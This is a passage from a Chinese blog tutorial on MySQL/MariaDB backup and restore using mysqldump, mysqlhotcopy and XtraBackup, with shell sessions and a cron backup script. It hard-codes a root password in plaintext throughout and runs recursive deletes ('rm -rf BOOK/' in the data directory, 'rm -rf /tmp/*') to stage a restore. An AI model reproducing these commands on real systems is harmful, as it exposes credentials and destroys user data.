#&#x5982;&#x679C;&#x5BFC;&#x5165;&#x65F6;&#xFF0C;&#x6CA1;&#x6709;&#x5BF9;&#x5E94;&#x7684;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x9700;&#x8981;&#x4F60;&#x624B;&#x52A8;&#x521B;&#x5EFA;&#x4E00;&#x4E0B;</span><br></pre></td></tr></tbody></table></figure><p></p><p>mysql&gt; create database testdb;</p><p>&#x4F7F;&#x7528;source&#x5BFC;&#x5165;<br>mysql&gt; drop database testdb;<br>mysql&gt; create database testdb;<br>mysql&gt; use testdb;<br>mysql&gt; source /tmp/testdb.sql</p><p>C:&#x5BFC;&#x5165;&#x8868;<br>mysql&gt; drop table testdb.book1;<br>mysql&gt; source /tmp/testdb.book1.sql;   #&#x5BFC;&#x5165;&#x8868;&#x65F6;&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x91CD;&#x65B0;&#x521B;&#x5EFA;&#x8868;&#xFF0C;&#x8981;&#x5148;&#x8FDB;&#x5230;&#x76F8;&#x5E94;&#x7684;&#x6570;&#x636E;&#x5E93;&#x4E2D;<br>mysql&gt; select * from testdb.book1;</p><p>D&#xFF1A;&#x5BFC;&#x5165;&#x8868;&#x7ED3;&#x6784;&#x548C;&#x6570;&#x636E;<br>mysql&gt; create database testdb;<br>mysql -uroot <a href="mailto:-pJaking@vip.163.com" target="_blank" rel="noopener">-pJaking@vip.163.com</a> testdb &lt; testdbtable.sql<br>mysql -uroot <a href="mailto:-pJaking@vip.163.com" target="_blank" rel="noopener">-pJaking@vip.163.com</a> testdb &lt; testdbdata.sql</p><p>mysqldump&#x8FDC;&#x7A0B;&#x5907;&#x4EFD;&#x4E0E;&#x6062;&#x590D;&#x6570;&#x636E;</p><p>&#x6587;&#x6863;&#xFF1A;10 mysqldump&#x8FDC;&#x7A0B;&#x5907;&#x4EFD;&#x4E0E;&#x6062;&#x590D;&#x6570;&#x636E;.md<br>&#x94FE;&#x63A5;&#xFF1A;<a href="http://note.youdao.com/noteshare?id=7af3e7cda297defe01228ed798e72c02&amp;sub=E2F44DF8E1BC4B9287EA434DEA3B670C" target="_blank" rel="noopener">http://note.youdao.com/noteshare?id=7af3e7cda297defe01228ed798e72c02&amp;sub=E2F44DF8E1BC4B9287EA434DEA3B670C</a></p><p>&#x8FDC;&#x7A0B;&#x5907;&#x4EFD;<br>mysqldump -h ip_addr -u db_user -p db_name &gt; file_name.sql<br>&#x8FDC;&#x7A0B;&#x6062;&#x590D;<br>mysql -h ip_addr -u db_user -p &lt; db_file.sql</p><p>3) mysqlhotcopy &#x88F8;&#x6587;&#x4EF6;&#x5907;&#x4EFD;    </p><p>&#x6CE8;&#x610F;&#xFF1A;5.7&#x7248;&#x672C;&#x5DF2;&#x7ECF;&#x53BB;&#x6389;&#x6B64;&#x547D;&#x4EE4;&#xFF0C;&#x8BF7;&#x5728;5.5&#x53CA;&#x4EE5;&#x4E0B;&#x7248;&#x672C;&#x6D4B;&#x8BD5;&#xFF01;<br>mysqlhotcopy&#x4F7F;&#x7528;lock tables&#x3001;flush tables&#x548C;cp&#x6216;scp&#x6765;&#x5FEB;&#x901F;&#x5907;&#x4EFD;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x5B83;&#x662F;&#x5907;&#x4EFD;&#x6570;&#x636E;&#x5E93;&#x6216;&#x5355;&#x4E2A;&#x8868;&#x6700;&#x5FEB;&#x7684;&#x9014;&#x5F84;,&#x5B8C;&#x5168;&#x5C5E;&#x4E8E;&#x7269;&#x7406;&#x5907;&#x4EFD;,&#x4F46;&#x53EA;&#x80FD;&#x7528;&#x4E8E;&#x5907;&#x4EFD;MyISAM&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x548C;&#x8FD0;&#x884C;&#x5728;&#x6570;&#x636E;&#x5E93;&#x76EE;&#x5F55;&#x6240;&#x5728;&#x7684;&#x673A;&#x5668;&#x4E0A;&#xFF0C;&#x4E0E;mysqldump&#x5907;&#x4EFD;&#x4E0D;&#x540C;,mysqldump&#x5C5E;&#x4E8E;&#x903B;&#x8F91;&#x5907;&#x4EFD;,&#x6062;&#x590D;&#x65F6;&#x662F;&#x6267;&#x884C;&#x7684;sql&#x8BED;&#x53E5;&#x3002;</p><p>mysqlhotcopy&#x672C;&#x8D28;&#x662F;&#x4F7F;&#x7528;&#x9501;&#x8868;&#x8BED;&#x53E5;&#x540E;&#x518D;&#x4F7F;&#x7528;cp&#x6216;scp&#x62F7;&#x8D1D;&#x6570;&#x636E;&#x5E93;</p><p>1.&#x5B89;&#x88C5;mysqlhotcopy</p><p>yum provides mysqlhotcopy<br>yum install -y mariadb-server</p><p>2.&#x67E5;&#x770B;mysqlhotcopy&#x5E2E;&#x52A9;&#x4FE1;&#x606F;</p><p>mysqlhotcopy &#x2013;help<br>  &#x2013;allowold   don&#x2019;t abort if target dir already exists (rename it _old) &#x2013;&#x4E0D;&#x8986;&#x76D6;&#x4EE5;&#x524D;&#x5907;&#x4EFD;&#x7684;&#x6587;&#x4EF6;<br>  &#x2013;addtodest  don&#x2019;t rename target dir if it exists, just add files to it      &#x2013;&#x5C5E;&#x4E8E;&#x589E;&#x91CF;&#x5907;&#x4EFD;<br>  &#x2013;noindices   don&#x2019;t include full index files in copy          &#x2013;&#x4E0D;&#x5907;&#x4EFD;&#x7D22;&#x5F15;&#x6587;&#x4EF6;<br>  &#x2013;debug     enable debug                                 &#x2013;&#x542F;&#x7528;&#x8C03;&#x8BD5;&#x8F93;&#x51FA;<br>  &#x2013;regexp=#   copy all databases with names matching regexp  &#x2013;&#x4F7F;&#x7528;&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;<br>  &#x2013;checkpoint=#  insert checkpoint entry into specified db.table    &#x2013;&#x63D2;&#x5165;&#x68C0;&#x67E5;&#x70B9;&#x6761;&#x76EE;<br>  &#x2013;flushlog      flush logs once all tables are locked          &#x2013;&#x6240;&#x6709;&#x8868;&#x9501;&#x5B9A;&#x540E;&#x5237;&#x65B0;&#x65E5;&#x5FD7;<br>  &#x2013;resetmaster    reset the binlog once all tables are locked     &#x2013;&#x4E00;&#x65E6;&#x9501;&#x8868;&#x91CD;&#x7F6E;binlog&#x6587;&#x4EF6;<br>  &#x2013;resetslave  reset the master.info once all tables are locked  &#x2013;&#x4E00;&#x65E6;&#x9501;&#x8868;&#x91CD;&#x7F6E;master.info&#x6587;&#x4EF6; </p><p>&#x4E3E;&#x4F8B;&#x8BF4;&#x660E;&#xFF1A;<br>A&#xFF1A;&#x5907;&#x4EFD;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x5230;&#x4E00;&#x4E2A;&#x76EE;&#x5F55;&#x4E2D;<br>mysqlhotcopy -u root -p <a href="mailto:Jaking@vip.163.com" target="_blank" rel="noopener">Jaking@vip.163.com</a> BOOK /tmp  #-u -p &#x540E;&#x9762;&#x90FD;&#x6709;&#x7A7A;&#x683C;</p><p>[root@jaking ~]# mysqlhotcopy -u root -p <a href="mailto:Jaking@vip.163.com" target="_blank" rel="noopener">Jaking@vip.163.com</a> BOOK /tmp<br>Flushed 1 tables with read lock (<code>BOOK</code>.<code>book</code>) in 0 seconds.<br>Locked 0 views () in 0 seconds.<br>Copying 2 files&#x2026;<br>Copying indices for 0 files&#x2026;<br>Unlocked tables.<br>mysqlhotcopy copied 1 tables (2 files) in 0 seconds (0 seconds overall).<br>[root@jaking ~]# ls /tmp<br>BOOK<br>[root@jaking ~]# ls /tmp/BOOK/<br>book.frm  db.opt</p><p>&#x5BF9;&#x6BD4;&#x4E0B;&#x5927;&#x5C0F;</p><p>[root@jaking ~]# du -sh /var/lib/mysql/BOOK/ /tmp/BOOK/<br>16K     /var/lib/mysql/BOOK/<br>16K     /tmp/BOOK/</p><p>B&#xFF1A;&#x5907;&#x4EFD;&#x591A;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x5230;&#x4E00;&#x4E2A;&#x76EE;&#x5F55;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking ~]# rm -rf /tmp/*</span><br><span class="line">[root@jaking ~]# mysqlhotcopy -u root -p Jaking@vip.163.com BOOK mysql /tmp/</span><br><span class="line">mysqlhotcopy -u root -p Jaking@vip.163.com BOOK mysql /tmp/</span><br><span class="line">Flushed 23 tables with read lock (`BOOK`.`book`, `mysql`.`columns_priv`, `mysql`.`db`, `mysql`.`event`, `mysql`.`func`, `mysql`.`help_category`, `mysql`.`help_keyword`, `mysql`.`help_relation`, `mysql`.`help_topic`, `mysql`.`host`, `mysql`.`ndb_binlog_index`, `mysql`.`plugin`, `mysql`.`proc`, `mysql`.`procs_priv`, `mysql`.`proxies_priv`, `mysql`.`servers`, `mysql`.`tables_priv`, `mysql`.`time_zone`, `mysql`.`time_zone_leap_second`, `mysql`.`time_zone_name`, `mysql`.`time_zone_transition`, `mysql`.`time_zone_transition_type`, `mysql`.`user`) in 0 seconds.</span><br><span class="line">Locked 0 views () in 0 seconds.</span><br><span class="line">Copying 2 files...</span><br><span class="line">Copying indices for 0 files...</span><br><span class="line">Copying 72 files...</span><br><span class="line">Copying indices for 0 files...</span><br><span class="line">Unlocked tables.</span><br><span class="line">mysqlhotcopy copied 24 tables (74 files) in 0 seconds (0 seconds overall).</span><br><span class="line"></span><br><span class="line">[root@jaking ~]# ls /tmp</span><br><span class="line">BOOK  mysql</span><br><span class="line">[root@jaking ~]# du -h /tmp </span><br><span class="line">0       /tmp/.X11-unix</span><br><span class="line">0       /tmp/.font-unix</span><br><span class="line">0       /tmp/.ICE-unix</span><br><span class="line">0       /tmp/.XIM-unix</span><br><span class="line">0       /tmp/.Test-unix</span><br><span class="line">16K     /tmp/BOOK</span><br><span class="line">1004K   /tmp/mysql</span><br><span class="line">1020K   /tmp</span><br><span class="line">[root@jaking ~]# du -h /var/lib/mysql/</span><br><span class="line">1004K   /var/lib/mysql/mysql</span><br><span class="line">212K    /var/lib/mysql/performance_schema</span><br><span class="line">16K     /var/lib/mysql/BOOK</span><br><span class="line">30M     /var/lib/mysql/</span><br></pre></td></tr></tbody></table></figure><p></p><p>C&#xFF1A;&#x5907;&#x4EFD;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x67D0;&#x4E2A;&#x8868;<br>&#x8BED;&#x6CD5;&#xFF1A;mysqlhotcopy -u &#x7528;&#x6237; -p &#x5BC6;&#x7801; &#x6570;&#x636E;&#x5E93;&#x540D;./&#x8981;&#x5907;&#x4EFD;&#x7684;&#x8868;&#x540D;/  &#x8981;&#x5907;&#x4EFD;&#x7684;&#x8DEF;&#x5F84;</p><p>mysqlhotcopy -u root -p <a href="mailto:Jaking@vip.163.com" target="_blank" rel="noopener">Jaking@vip.163.com</a> BOOK./book/ /tmp/   #&#x6CE8;&#x610F;&#x6700;&#x540E;&#x7684; / &#x4E00;&#x5B9A;&#x8981;&#x6709;&#xFF01;<br>&#x5B9E;&#x9645;&#x4E0A;&#x662F;&#x628A;&#x5BF9;&#x5E94;&#x7684;&#x8868;&#x6587;&#x4EF6;&#x590D;&#x5236;&#x5230;/tmp&#x76EE;&#x5F55;&#x4E0B;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking ~]# rm -rf *</span><br><span class="line">[root@jaking ~]# mysqlhotcopy -u root -p Jaking@vip.163.com BOOK./book/ /tmp/   Flushed 1 tables with read lock (`BOOK`.`book`) in 0 seconds.</span><br><span class="line">Locked 0 views () in 0 seconds.</span><br><span class="line">Copying 1 files...</span><br><span class="line">Copying indices for 0 files...</span><br><span class="line">Unlocked tables.</span><br><span class="line">mysqlhotcopy copied 1 tables (1 files) in 0 seconds (0 seconds overall).</span><br><span class="line">[root@jaking ~]# ls BOOK/</span><br><span class="line">book.frm</span><br><span class="line">[root@jaking ~]# ll /tmp/BOOK/</span><br><span class="line">total 12</span><br><span class="line">-rw-rw---- 1 mysql mysql 8624 Apr 22 14:31 book.frm</span><br></pre></td></tr></tbody></table></figure><p></p><p>D:&#x6062;&#x590D;&#x6570;&#x636E;</p><p>&#x7834;&#x574F;&#x6570;&#x636E;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking tmp]# cd /var/lib/mysql/</span><br><span class="line">[root@jaking mysql]# ls</span><br><span class="line">aria_log.00000001  BOOK     ib_logfile0  mysql       performance_schema</span><br><span class="line">aria_log_control   ibdata1  ib_logfile1  mysql.sock</span><br><span class="line">[root@jaking mysql]# rm -rf BOOK/</span><br><span class="line">[root@jaking mysql]# ls</span><br><span class="line">aria_log.00000001  ibdata1      ib_logfile1  mysql.sock</span><br><span class="line">aria_log_control   ib_logfile0  mysql        performance_schema</span><br><span class="line">[root@jaking mysql]#</span><br><span class="line"></span><br><span class="line">[root@jaking ~]# mysql -uroot -pJaking@vip.163.com</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 39</span><br><span class="line">Server version: 5.5.52-MariaDB MariaDB Server</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2016, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| Database           |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">3 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(<span class="keyword">none</span>)]&gt;</span><br></pre></td></tr></tbody></table></figure><p>&#x5F00;&#x59CB;&#x6062;&#x590D;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking mysql]# cp -ra /tmp/BOOK/ /var/lib/mysql/</span><br><span class="line">[root@jaking mysql]# ll /var/lib/mysql/</span><br><span class="line">total 28700</span><br><span class="line">-rw-rw---- 1 mysql mysql    16384 Apr 22 14:29 aria_log.00000001</span><br><span class="line">-rw-rw---- 1 mysql mysql       52 Apr 22 14:29 aria_log_control</span><br><span class="line">drwxr-x--- 2 mysql mysql       22 Apr 22 14:53 BOOK</span><br><span class="line">-rw-rw---- 1 mysql mysql 18874368 Apr 22 14:53 ibdata1</span><br><span class="line">-rw-rw---- 1 mysql mysql  5242880 Apr 22 14:53 ib_logfile0</span><br><span class="line">-rw-rw---- 1 mysql mysql  5242880 Apr 22 14:29 ib_logfile1</span><br><span class="line">drwx------ 2 mysql mysql     4096 Apr 22 14:29 mysql</span><br><span class="line">srwxrwxrwx 1 mysql mysql        0 Apr 22 14:29 mysql.sock</span><br><span class="line">drwx------ 2 mysql mysql     4096 Apr 22 14:29 performance_schema</span><br><span class="line">[root@jaking mysql]# chown -Rf mysql:mysql /var/lib/mysql/BOOK/</span><br><span class="line"></span><br><span class="line">[root@jaking ~]# mysql -uroot -pJaking@vip.163.com</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 40</span><br><span class="line">Server version: 5.5.52-MariaDB MariaDB Server</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2016, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| Database           |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">| BOOK               |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(<span class="keyword">none</span>)]&gt; <span class="keyword">use</span> BOOK;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup <span class="keyword">with</span> -A</span><br><span class="line"></span><br><span class="line"><span class="keyword">Database</span> <span class="keyword">changed</span></span><br><span class="line">MariaDB [BOOK]&gt; <span class="keyword">show</span> <span class="keyword">tables</span>;</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">| Tables_in_BOOK |</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">| book           |</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [BOOK]&gt; <span class="keyword">select</span> * <span class="keyword">from</span> book;</span><br><span class="line">+<span class="comment">-------------------------+-------+-------+</span></span><br><span class="line">| name                    | price | pages |</span><br><span class="line">+<span class="comment">-------------------------+-------+-------+</span></span><br><span class="line">| Linux                   |    30 |   666 |</span><br><span class="line">| Cloud Computing         |    60 |   666 |</span><br><span class="line">| Operation System        |    80 |   666 |</span><br><span class="line">| Artificial Intelligence |   166 |   666 |</span><br><span class="line">+<span class="comment">-------------------------+-------+-------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [BOOK]&gt;</span><br></pre></td></tr></tbody></table></figure><p>&#x603B;&#x7ED3;&#xFF1A;<br>mysqldump&#x548C;mysqlhotcopy&#x7684;&#x6BD4;&#x8F83;&#xFF1A;<br>1&#x3001;mysqldump &#x662F;&#x91C7;&#x7528;SQL&#x7EA7;&#x522B;&#x7684;&#x5907;&#x4EFD;&#x673A;&#x5236;&#xFF0C;&#x5B83;&#x5C06;&#x6570;&#x636E;&#x8868;&#x5BFC;&#x6210; SQL &#x811A;&#x672C;&#x6587;&#x4EF6;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x5927;&#x65F6;&#xFF0C;&#x5360;&#x7528;&#x7CFB;&#x7EDF;&#x8D44;&#x6E90;&#x8F83;&#x591A;&#xFF0C;&#x652F;&#x6301;&#x5E38;&#x7528;&#x7684;MyISAM&#xFF0C;Innodb<br>2&#x3001;mysqlhotcopy&#x53EA;&#x662F;&#x7B80;&#x5355;&#x7684;&#x7F13;&#x5B58;&#x5199;&#x5165;&#x548C;&#x6587;&#x4EF6;&#x590D;&#x5236;&#x7684;&#x8FC7;&#x7A0B;&#xFF0C;&#x5360;&#x7528;&#x8D44;&#x6E90;&#x548C;&#x5907;&#x4EFD;&#x901F;&#x5EA6;&#x6BD4;mysqldump&#x5FEB;&#x5F88;&#x591A;&#xFF1B;&#x7279;&#x522B;&#x9002;&#x5408;&#x5927;&#x7684;&#x6570;&#x636E;&#x5E93;<br>3&#x3001;mysqlhotcopy&#x53EA;&#x80FD;&#x8FD0;&#x884C;&#x5728;&#x6570;&#x636E;&#x5E93;&#x6570;&#x636E;&#x76EE;&#x5F55;&#x6240;&#x5728;&#x7684;&#x673A;&#x5668;&#x4E0A;&#xFF0C;mysqldump&#x53EF;&#x4EE5;&#x7528;&#x5728;&#x8FDC;&#x7A0B;&#x5BA2;&#x6237;&#x7AEF;<br>4&#x3001;&#x76F8;&#x540C;&#x7684;&#x5730;&#x65B9;&#x90FD;&#x662F;&#x5728;&#x7EBF;&#x6267;&#x884C;LOCK TABLES &#x4EE5;&#x53CA; UNLOCK TABLES<br>5&#x3001;mysqlhotcopy&#x6062;&#x590D;&#x53EA;&#x9700;&#x8981;COPY&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x5230;&#x6E90;&#x76EE;&#x5F55;&#x8986;&#x76D6;&#x5373;&#x53EF;&#xFF0C;mysqldump&#x9700;&#x8981;&#x5BFC;&#x5165;SQL&#x6587;&#x4EF6;&#x5230;&#x539F;&#x6765;&#x5E93;&#x4E2D;</p><p>&#x5B9E;&#x6218;&#xFF1A;&#x5199;&#x4E2A;&#x81EA;&#x52A8;&#x5907;&#x4EFD;MySQL&#x6570;&#x636E;&#x5E93;shell&#x811A;&#x672C;<br>vim  mysql-autoback.sh </p><p>#!/bin/bash<br>export LANG=en_US.UTF-8<br>mkdir /database_back &amp;&gt;/dev/null<br>savedir=/database_back<br>cd &#x201C;$savedir&#x201D;<br>time=&#x201D;$(date +&#x201D;%Y-%m-%d&#x201D;)&#x201D;<br>mysqldump -u root <a href="mailto:-pJaking@vip.163.com" target="_blank" rel="noopener">-pJaking@vip.163.com</a> book &gt; book-&#x201C;$time&#x201D;.sql  </p><p>&#x518D;&#x6DFB;&#x52A0;&#x8BA1;&#x5212;&#x4EFB;&#x52A1; crontab &#x5C31;&#x884C;</p><p>xtrabackup&#x5907;&#x4EFD;&#x5DE5;&#x5177;&#x4F7F;&#x7528;</p><p>1&#x3001;xtrabackup&#x7B80;&#x4ECB;</p><p>Xtrabackup&#x5305;&#x62EC;&#x4E24;&#x4E2A;&#x4E3B;&#x8981;&#x5DE5;&#x5177;&#xFF1A;Xtrabackup&#x548C;innobackupex&#xFF1A;<br>Xtrabackup&#x53EA;&#x80FD;&#x5907;&#x4EFD;InnoDB&#x548C;XtraDB&#x4E24;&#x79CD;&#x5F15;&#x64CE;&#x8868;&#xFF0C;&#x800C;&#x4E0D;&#x80FD;&#x5907;&#x4EFD;MyISAM&#x6570;&#x636E;&#x8868;</p><p>&#x6211;&#x4EEC;&#x77E5;&#x9053;&#xFF0C;&#x9488;&#x5BF9;InnoDB&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#xFF0C;MySQL&#x672C;&#x8EAB;&#x6CA1;&#x6709;&#x63D0;&#x4F9B;&#x5408;&#x9002;&#x7684;&#x70ED;&#x5907;&#x5DE5;&#x5177;&#xFF0C;ibbackup&#x867D;&#x662F;&#x4E00;&#x6B3E;&#x9AD8;&#x6548;&#x7684;&#x9996;&#x9009;&#x70ED;&#x5907;&#x65B9;&#x5F0F;&#xFF0C;&#x4F46;&#x5B83;&#x662F;&#x662F;&#x6536;&#x8D39;&#x7684;&#x3002;&#x597D;&#x5728;Percona&#x516C;&#x53F8;&#x7ED9;&#x5927;&#x5BB6;&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x4E2A;&#x5F00;&#x6E90;&#x3001;&#x514D;&#x8D39;&#x7684;Xtrabackup&#x70ED;&#x5907;&#x5DE5;&#x5177;&#xFF0C;&#x5B83;&#x53EF;&#x5B9E;&#x73B0;ibbackup&#x7684;&#x6240;&#x6709;&#x529F;&#x80FD;&#xFF0C;&#x5E76;&#x4E14;&#x8FD8;&#x6269;&#x5C55;&#x652F;&#x6301;&#x771F;&#x6B63;&#x7684;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x529F;&#x80FD;&#xFF0C;&#x662F;&#x5546;&#x4E1A;&#x5907;&#x4EFD;&#x5DE5;&#x5177;InnoDB Hotbackup&#x7684;&#x4E00;&#x4E2A;&#x5F88;&#x597D;&#x7684;&#x66FF;&#x4EE3;&#x54C1;&#x3002;</p><p>2&#x3001;Percona-XtraBackup &#x5B89;&#x88C5; &#xFF08;mysql5.7.20&#x9700;&#x5B89;&#x88C5;XtraBackup2.4.9&#xFF09;</p><p>&#x4E0B;&#x8F7D;&#x5B89;&#x88C5;&#x5305;<br> [root@jaking ~]# wget <a href="https://www.percona.com/downloads/XtraBackup/Percona-XtraBackup-2.4.9/binary/redhat/7/x86_64/Percona-XtraBackup-2.4.9-ra467167cdd4-el7-x86_64-bundle.tar" target="_blank" rel="noopener">https://www.percona.com/downloads/XtraBackup/Percona-XtraBackup-2.4.9/binary/redhat/7/x86_64/Percona-XtraBackup-2.4.9-ra467167cdd4-el7-x86_64-bundle.tar</a> </p><p>&#x89E3;&#x538B;&#x5305;<br>[root@jaking ~]# tar -xvf Percona-XtraBackup-2.4.9-ra467167cdd4-el7-x86_64-bundle.tar </p><p>yum&#x5B89;&#x88C5;&#x5E76;&#x89E3;&#x51B3;&#x4F9D;&#x8D56;&#xFF1A;<br>yum -y localinstall percona-xtrabackup-24-2.4.9-1.el7.x86_64.rpm </p><p>&#x6216;&#x8005;<br>yum install -y <a href="https://repo.percona.com/yum/percona-release-latest.noarch.rpm" target="_blank" rel="noopener">https://repo.percona.com/yum/percona-release-latest.noarch.rpm</a></p><p>&#x6216;&#x8005;<br>rpm -ivh percona-release-latest.noarch.rpm</p><p>yum install -y percona-xtrabackup-24.x86_64</p><p>&#x5982;&#x679C;&#x51FA;&#x73B0;&#x4EE5;&#x4E0B;&#x62A5;&#x9519;&#xFF1A;<br>Error: Package: percona-xtrabackup-24-2.4.22-1.el7.x86_64 (percona-release-x86_64)<br>           Requires: libev.so.4()(64bit)</p><p>&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#xFF1A;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking ~]# wget ftp://rpmfind.net/linux/atrpms/el6-x86_64/atrpms/stable/libev-4.04-2.el6.x86_64.rpm</span><br><span class="line">[root@jaking ~]# rpm -ivh libev-4.04-2.el6.x86_64.rpm </span><br><span class="line">[root@jaking ~]# rz</span><br><span class="line">rz waiting to receive.</span><br><span class="line">&#xA0;zmodem trl+C &#x221;</span><br><span class="line"></span><br><span class="line"><span class="meta">&#xA0; 100%</span><span class="bash">&#xA0;&#xA0;&#xA0; 7805 KB 7805 KB/s 00:00:01&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 0 